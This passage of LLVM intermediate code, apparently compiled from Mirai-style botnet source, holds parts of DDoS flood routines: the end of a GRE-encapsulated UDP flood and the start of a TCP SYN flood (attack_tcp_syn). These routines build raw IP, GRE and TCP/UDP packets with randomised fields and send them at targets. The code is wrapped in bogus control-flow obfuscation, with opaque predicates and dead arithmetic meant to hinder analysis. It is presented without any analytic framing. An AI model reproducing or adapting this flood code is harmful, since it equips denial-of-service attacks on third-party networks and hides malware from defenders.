  %611 = load i16, i16* %610, align 2
  %612 = load i32, i32* %20, align 4
  %613 = sext i32 %612 to i64
  %614 = add i64 8, %613
  %615 = trunc i64 %614 to i32
  %616 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %606, i8* %608, i16 zeroext %611, i32 %615)
  %617 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %618 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %617, i32 0, i32 3
  store i16 %616, i16* %618, align 2
  %619 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %620 = load i32, i32* %11, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i64 %621
  %623 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %622, i32 0, i32 0
  %624 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %623, i32 0, i32 0
  store i16 2, i16* %624, align 4
  %625 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %626 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %625, i32 0, i32 9
  %627 = load i32, i32* %626, align 4
  %628 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %629 = load i32, i32* %11, align 4
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %628, i64 %630
  %632 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %631, i32 0, i32 0
  %633 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %632, i32 0, i32 2
  %634 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %633, i32 0, i32 0
  store i32 %627, i32* %634, align 4
  %635 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %636 = load i32, i32* %11, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %635, i64 %637
  %639 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %638, i32 0, i32 0
  %640 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %639, i32 0, i32 1
  store i16 0, i16* %640, align 2
  %641 = load i32, i32* %12, align 4
  %642 = load i8*, i8** %33, align 8
  %643 = load i32, i32* %20, align 4
  %644 = sext i32 %643 to i64
  %645 = add i64 66, %644
  %646 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %647 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %648 = load i32, i32* %11, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %647, i64 %649
  %651 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %650, i32 0, i32 0
  %652 = bitcast %struct.sockaddr_in* %651 to %struct.sockaddr*
  store %struct.sockaddr* %652, %struct.sockaddr** %646, align 8
  %653 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %654 = load %struct.sockaddr*, %struct.sockaddr** %653, align 8
  %655 = call i64 @sendto(i32 %641, i8* %642, i64 %645, i32 16384, %struct.sockaddr* %654, i32 16)
  br label %656

; <label>:656:                                    ; preds = %589
  %657 = load i32, i32* %11, align 4
  %658 = add nsw i32 %657, 1
  store i32 %658, i32* %11, align 4
  br label %361

; <label>:659:                                    ; preds = %361
  %660 = load i32, i32* @x.21
  %661 = load i32, i32* @y.22
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %659
  %668 = call i64 @time(i64* null) #6
  %669 = load i32, i32* %24, align 4
  %670 = sext i32 %669 to i64
  %671 = icmp sgt i64 %668, %670
  %672 = load i32, i32* @x.21
  %673 = load i32, i32* @y.22
  %674 = sub i32 %672, 1
  %675 = mul i32 %672, %674
  %676 = urem i32 %675, 2
  %677 = icmp eq i32 %676, 0
  %678 = icmp slt i32 %673, 10
  %679 = or i1 %677, %678
  br i1 %679, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br i1 %671, label %680, label %697

; <label>:680:                                    ; preds = %originalBBpart2103
  %681 = load i32, i32* @x.21
  %682 = load i32, i32* @y.22
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %680
  %689 = load i32, i32* @x.21
  %690 = load i32, i32* @y.22
  %691 = sub i32 %689, 1
  %692 = mul i32 %689, %691
  %693 = urem i32 %692, 2
  %694 = icmp eq i32 %693, 0
  %695 = icmp slt i32 %690, 10
  %696 = or i1 %694, %695
  br i1 %696, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %698

; <label>:697:                                    ; preds = %originalBBpart2103
  br label %344

; <label>:698:                                    ; preds = %originalBBpart2107, %originalBBpart2, %94
  %699 = load i32, i32* @x.21
  %700 = load i32, i32* @y.22
  %701 = sub i32 %699, 1
  %702 = mul i32 %699, %701
  %703 = urem i32 %702, 2
  %704 = icmp eq i32 %703, 0
  %705 = icmp slt i32 %700, 10
  %706 = or i1 %704, %705
  br i1 %706, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %698
  %707 = load i32, i32* @x.21
  %708 = load i32, i32* @y.22
  %709 = sub i32 %707, 1
  %710 = mul i32 %707, %709
  %711 = urem i32 %710, 2
  %712 = icmp eq i32 %711, 0
  %713 = icmp slt i32 %708, 10
  %714 = or i1 %712, %713
  br i1 %714, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %100
  %715 = load i32, i32* %12, align 4
  %716 = call i32 @close(i32 %715)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %125
  %717 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %718 = load i8**, i8*** %13, align 8
  %719 = load i32, i32* %11, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds i8*, i8** %718, i64 %720
  store i8* %717, i8** %721, align 8
  %722 = load i8**, i8*** %13, align 8
  %723 = load i32, i32* %11, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds i8*, i8** %722, i64 %724
  %726 = load i8*, i8** %725, align 8
  %727 = bitcast i8* %726 to %struct.iphdr*
  store %struct.iphdr* %727, %struct.iphdr** %25, align 8
  %728 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %729 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %728, i64 1
  %730 = bitcast %struct.iphdr* %729 to %struct.grehdr*
  store %struct.grehdr* %730, %struct.grehdr** %26, align 8
  %731 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %732 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %731, i64 1
  %733 = bitcast %struct.grehdr* %732 to %struct.ethhdr*
  store %struct.ethhdr* %733, %struct.ethhdr** %27, align 8
  %734 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %735 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %734, i64 1
  %736 = bitcast %struct.ethhdr* %735 to %struct.iphdr*
  store %struct.iphdr* %736, %struct.iphdr** %28, align 8
  %737 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %738 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %737, i64 1
  %739 = bitcast %struct.iphdr* %738 to %struct.udphdr*
  store %struct.udphdr* %739, %struct.udphdr** %29, align 8
  %740 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %741 = bitcast %struct.iphdr* %740 to i8*
  %742 = load i8, i8* %741, align 4
  %_ = shl i8 %742, 15
  %_2 = shl i8 %742, 15
  %743 = and i8 %742, 15
  %_3 = sub i8 0, %743
  %gen = add i8 %_3, 64
  %_4 = sub i8 0, %743
  %gen5 = add i8 %_4, 64
  %_6 = shl i8 %743, 64
  %744 = or i8 %743, 64
  store i8 %744, i8* %741, align 4
  %745 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %746 = bitcast %struct.iphdr* %745 to i8*
  %747 = load i8, i8* %746, align 4
  %_7 = sub i8 %747, -16
  %gen8 = mul i8 %_7, -16
  %_9 = sub i8 %747, -16
  %gen10 = mul i8 %_9, -16
  %_11 = sub i8 0, %747
  %gen12 = add i8 %_11, -16
  %748 = and i8 %747, -16
  %_13 = sub i8 %748, 5
  %gen14 = mul i8 %_13, 5
  %_15 = sub i8 0, %748
  %gen16 = add i8 %_15, 5
  %_17 = shl i8 %748, 5
  %_18 = sub i8 %748, 5
  %gen19 = mul i8 %_18, 5
  %_20 = sub i8 %748, 5
  %gen21 = mul i8 %_20, 5
  %_22 = sub i8 0, %748
  %gen23 = add i8 %_22, 5
  %749 = or i8 %748, 5
  store i8 %749, i8* %746, align 4
  %750 = load i8, i8* %14, align 1
  %751 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %752 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %751, i32 0, i32 1
  store i8 %750, i8* %752, align 1
  %753 = load i32, i32* %20, align 4
  %754 = sext i32 %753 to i64
  %_24 = shl i64 66, %754
  %_25 = sub i64 66, %754
  %gen26 = mul i64 %_25, %754
  %755 = add i64 66, %754
  %756 = trunc i64 %755 to i16
  %757 = call zeroext i16 @htons(i16 zeroext %756) #7
  %758 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %759 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %758, i32 0, i32 2
  store i16 %757, i16* %759, align 2
  %760 = load i16, i16* %15, align 2
  %761 = call zeroext i16 @htons(i16 zeroext %760) #7
  %762 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %763 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %762, i32 0, i32 3
  store i16 %761, i16* %763, align 4
  %764 = load i8, i8* %16, align 1
  %765 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %766 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %765, i32 0, i32 5
  store i8 %764, i8* %766, align 4
  %767 = load i8, i8* %17, align 1
  %768 = icmp ne i8 %767, 0
  br label %originalBB1

originalBB30alteredBB:                            ; preds = %originalBB30, %262
  %769 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %770 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %769, i32 0, i32 9
  %771 = load i32, i32* %770, align 4
  %772 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %773 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %772, i32 0, i32 9
  store i32 %771, i32* %773, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %284
  %774 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %775 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %774, i32 0, i32 8
  %776 = load i32, i32* %775, align 4
  %777 = sub i32 %776, 1024
  %_35 = sub i32 %777, -1
  %gen36 = mul i32 %_35, -1
  %778 = xor i32 %777, -1
  %779 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %780 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %779, i32 0, i32 9
  store i32 %778, i32* %780, align 4
  br label %originalBB34

originalBB40alteredBB:                            ; preds = %originalBB40, %327
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %344
  store i32 0, i32* %11, align 4
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %397
  %781 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %782 = load i32, i32* %11, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %781, i64 %783
  %785 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %784, i32 0, i32 1
  %786 = load i32, i32* %785, align 4
  %787 = call i32 @ntohl(i32 %786) #7
  %788 = call i32 @rand_next()
  %789 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %790 = load i32, i32* %11, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %789, i64 %791
  %793 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %792, i32 0, i32 2
  %794 = load i8, i8* %793, align 4
  %795 = zext i8 %794 to i32
  %_49 = sub i32 %788, %795
  %gen50 = mul i32 %_49, %795
  %_51 = sub i32 %788, %795
  %gen52 = mul i32 %_51, %795
  %796 = lshr i32 %788, %795
  %_53 = shl i32 %787, %796
  %_54 = sub i32 %787, %796
  %gen55 = mul i32 %_54, %796
  %_56 = shl i32 %787, %796
  %_57 = shl i32 %787, %796
  %_58 = sub i32 0, %787
  %gen59 = add i32 %_58, %796
  %_60 = sub i32 %787, %796
  %gen61 = mul i32 %_60, %796
  %_62 = sub i32 %787, %796
  %gen63 = mul i32 %_62, %796
  %797 = add i32 %787, %796
  %798 = call i32 @htonl(i32 %797) #7
  %799 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %800 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %799, i32 0, i32 9
  store i32 %798, i32* %800, align 4
  br label %originalBB48

originalBB67alteredBB:                            ; preds = %originalBB67, %441
  %801 = load i16, i16* %15, align 2
  %802 = zext i16 %801 to i32
  %803 = icmp eq i32 %802, 65535
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %461
  %804 = call i32 @rand_next()
  %_72 = sub i32 0, %804
  %gen73 = add i32 %_72, 65535
  %_74 = sub i32 %804, 65535
  %gen75 = mul i32 %_74, 65535
  %805 = and i32 %804, 65535
  %806 = trunc i32 %805 to i16
  %807 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %808 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %807, i32 0, i32 3
  store i16 %806, i16* %808, align 4
  %809 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %810 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %809, i32 0, i32 3
  %811 = load i16, i16* %810, align 4
  %812 = zext i16 %811 to i32
  %_76 = sub i32 %812, 1000
  %gen77 = mul i32 %_76, 1000
  %_78 = sub i32 %812, 1000
  %gen79 = mul i32 %_78, 1000
  %813 = sub nsw i32 %812, 1000
  %_80 = sub i32 0, %813
  %gen81 = add i32 %_80, -1
  %_82 = shl i32 %813, -1
  %_83 = sub i32 %813, -1
  %gen84 = mul i32 %_83, -1
  %814 = xor i32 %813, -1
  %815 = trunc i32 %814 to i16
  %816 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %817 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %816, i32 0, i32 3
  store i16 %815, i16* %817, align 4
  br label %originalBB71

originalBB88alteredBB:                            ; preds = %originalBB88, %502
  %818 = load i16, i16* %19, align 2
  %819 = zext i16 %818 to i32
  %820 = icmp eq i32 %819, 65535
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %522
  %821 = call i32 @rand_next()
  %_93 = shl i32 %821, 65535
  %_94 = shl i32 %821, 65535
  %_95 = sub i32 0, %821
  %gen96 = add i32 %_95, 65535
  %_97 = shl i32 %821, 65535
  %822 = and i32 %821, 65535
  %823 = trunc i32 %822 to i16
  %824 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %825 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %824, i32 0, i32 1
  store i16 %823, i16* %825, align 2
  br label %originalBB92

originalBB101alteredBB:                           ; preds = %originalBB101, %659
  %826 = call i64 @time(i64* null) #6
  %827 = load i32, i32* %24, align 4
  %828 = sext i32 %827 to i64
  %829 = icmp sgt i64 %826, %828
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %680
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %698
  br label %originalBB109
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.23
  %7 = load i32, i32* @y.24
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8**, align 8
  %22 = alloca i8, align 1
  %23 = alloca i16, align 2
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i16, align 2
  %27 = alloca i16, align 2
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i8, align 1
  %35 = alloca i8, align 1
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca %struct.iphdr*, align 8
  %39 = alloca %struct.tcphdr*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca %struct.iphdr*, align 8
  %43 = alloca %struct.tcphdr*, align 8
  %44 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %45 = load i8, i8* %15, align 1
  %46 = zext i8 %45 to i64
  %47 = call noalias i8* @calloc(i64 %46, i64 8) #6
  %48 = bitcast i8* %47 to i8**
  store i8** %48, i8*** %21, align 8
  %49 = load i8, i8* %17, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 2, i32 0)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %22, align 1
  %53 = load i8, i8* %17, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 3, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %23, align 2
  %57 = load i8, i8* %17, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 4, i32 64)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %24, align 1
  %61 = load i8, i8* %17, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 5, i32 1)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %25, align 1
  %65 = load i8, i8* %17, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 6, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %26, align 2
  %69 = load i8, i8* %17, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 7, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %27, align 2
  %73 = load i8, i8* %17, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 16, i32 65535)
  store i32 %75, i32* %28, align 4
  %76 = load i8, i8* %17, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 17, i32 0)
  store i32 %78, i32* %29, align 4
  %79 = load i8, i8* %17, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 10, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %30, align 1
  %83 = load i8, i8* %17, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 11, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %31, align 1
  %87 = load i8, i8* %17, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 12, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %32, align 1
  %91 = load i8, i8* %17, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 13, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %33, align 1
  %95 = load i8, i8* %17, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 14, i32 1)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %34, align 1
  %99 = load i8, i8* %17, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 15, i32 0)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %35, align 1
  %103 = load i8, i8* %17, align 1
  %104 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %105 = load i32, i32* @LOCAL_ADDR, align 4
  %106 = call i32 @attack_get_opt_ip(i8 zeroext %103, %struct.attack_option* %104, i8 zeroext 24, i32 %105)
  store i32 %106, i32* %36, align 4
  %107 = call i64 @time(i64* null) #6
  %108 = load i32, i32* %14, align 4
  %109 = sext i32 %108 to i64
  %110 = add nsw i64 %107, %109
  %111 = trunc i64 %110 to i32
  store i32 %111, i32* %37, align 4
  %112 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %112, i32* %20, align 4
  %113 = icmp eq i32 %112, -1
  %114 = load i32, i32* @x.23
  %115 = load i32, i32* @y.24
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %113, label %122, label %123

; <label>:122:                                    ; preds = %originalBBpart2
  br label %675

; <label>:123:                                    ; preds = %originalBBpart2
  store i32 1, i32* %19, align 4
  %124 = load i32, i32* %20, align 4
  %125 = bitcast i32* %19 to i8*
  %126 = call i32 @setsockopt(i32 %124, i32 0, i32 3, i8* %125, i32 4) #6
  %127 = icmp eq i32 %126, -1
  br i1 %127, label %128, label %131

; <label>:128:                                    ; preds = %123
  %129 = load i32, i32* %20, align 4
  %130 = call i32 @close(i32 %129)
  br label %675

; <label>:131:                                    ; preds = %123
  %132 = load i32, i32* @x.23
  %133 = load i32, i32* @y.24
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %131
  store i32 0, i32* %19, align 4
  %140 = load i32, i32* @x.23
  %141 = load i32, i32* @y.24
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart26, label %originalBB4alteredBB

originalBBpart26:                                 ; preds = %originalBB4
  br label %148

; <label>:148:                                    ; preds = %357, %originalBBpart26
  %149 = load i32, i32* %19, align 4
  %150 = load i8, i8* %15, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp slt i32 %149, %151
  br i1 %152, label %153, label %360

; <label>:153:                                    ; preds = %148
  %154 = load i32, i32* @x.23
  %155 = load i32, i32* @y.24
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %153
  %162 = call noalias i8* @calloc(i64 128, i64 1) #6
  %163 = load i8**, i8*** %21, align 8
  %164 = load i32, i32* %19, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i8*, i8** %163, i64 %165
  store i8* %162, i8** %166, align 8
  %167 = load i8**, i8*** %21, align 8
  %168 = load i32, i32* %19, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8*, i8** %167, i64 %169
  %171 = load i8*, i8** %170, align 8
  %172 = bitcast i8* %171 to %struct.iphdr*
  store %struct.iphdr* %172, %struct.iphdr** %38, align 8
  %173 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i64 1
  %175 = bitcast %struct.iphdr* %174 to %struct.tcphdr*
  store %struct.tcphdr* %175, %struct.tcphdr** %39, align 8
  %176 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i64 1
  %178 = bitcast %struct.tcphdr* %177 to i8*
  store i8* %178, i8** %40, align 8
  %179 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %180 = bitcast %struct.iphdr* %179 to i8*
  %181 = load i8, i8* %180, align 4
  %182 = and i8 %181, 15
  %183 = or i8 %182, 64
  store i8 %183, i8* %180, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %185 = bitcast %struct.iphdr* %184 to i8*
  %186 = load i8, i8* %185, align 4
  %187 = and i8 %186, -16
  %188 = or i8 %187, 5
  store i8 %188, i8* %185, align 4
  %189 = load i8, i8* %22, align 1
  %190 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 1
  store i8 %189, i8* %191, align 1
  %192 = call zeroext i16 @htons(i16 zeroext 60) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 2
  store i16 %192, i16* %194, align 2
  %195 = load i16, i16* %23, align 2
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 3
  store i16 %196, i16* %198, align 4
  %199 = load i8, i8* %24, align 1
  %200 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 5
  store i8 %199, i8* %201, align 4
  %202 = load i8, i8* %25, align 1
  %203 = icmp ne i8 %202, 0
  %204 = load i32, i32* @x.23
  %205 = load i32, i32* @y.24
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart247, label %originalBB8alteredBB

originalBBpart247:                                ; preds = %originalBB8
  br i1 %203, label %212, label %216

; <label>:212:                                    ; preds = %originalBBpart247
  %213 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 4
  store i16 %213, i16* %215, align 2
  br label %216

; <label>:216:                                    ; preds = %212, %originalBBpart247
  %217 = load i32, i32* @x.23
  %218 = load i32, i32* @y.24
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %216
  %225 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 6
  store i8 6, i8* %226, align 1
  %227 = load i32, i32* %36, align 4
  %228 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 8
  store i32 %227, i32* %229, align 4
  %230 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %231 = load i32, i32* %19, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 1
  %235 = load i32, i32* %234, align 4
